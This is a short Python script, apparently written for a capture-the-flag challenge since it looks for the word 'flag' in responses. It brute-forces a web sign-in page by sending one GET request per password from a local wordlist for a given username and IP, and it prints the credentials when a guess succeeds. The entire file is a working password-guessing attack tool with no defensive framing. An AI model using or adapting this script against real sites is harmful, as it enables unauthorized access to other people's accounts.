import requests

ip = input("site ip = ")
username = input("try with username = ")

try:
	pwd_list = open('password_list').read().splitlines()

	session = requests.session()
	for word in pwd_list:
		response = session.get(f"http://{ip}/?page=signin&username={username}&password={word}&Login=Login")
		# print(f"http://{ip}/?page=signin&username={username}&password={word}&Login=Login")
		if response.status_code == 200:
			content = str(response.content)
			if content.find("flag") != -1:
				print(f"username = {username}\npassword = {word}")
				break

except Exception as e:
	print(e)
